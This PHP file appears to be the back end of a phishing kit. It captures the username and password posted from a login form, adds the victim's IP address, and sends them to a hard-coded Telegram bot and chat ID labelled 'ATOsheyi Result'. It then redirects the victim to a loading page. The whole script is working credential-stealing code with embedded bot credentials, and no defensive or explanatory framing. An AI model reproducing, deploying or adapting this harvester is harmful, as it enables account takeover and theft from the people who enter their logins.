<?php
date_default_timezone_set('Asia/Manila');
$ip = $_SERVER['REMOTE_ADDR'];
$username = $_POST['username'];
$password = $_POST['password'];

$token = "8095624182:AAEUxkJiEpknLWhhfEkiPocnqEstj0K4ecY";
$user_id = 7827925482;
$mesg = "============ LogATOsheyi Result============\nUsername: $username\nPassword: $password\nIP: $ip\n============ATOsheyi Result============";
$request_params = [
'chat_id' => $user_id,
'text' => $mesg
];
$request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);
file_get_contents($request_url);

header("location: loading.html");
  function generateRandomString($length) {
    $include_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    /* Uncomment below to include symbols */
    /* $include_chars .= "[{(!@#$%^/&*_+;?\:)}]"; */
    $charLength = strlen($include_chars);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $include_chars [rand(0, $charLength - 1)];
    }
    return $randomString;
}
?>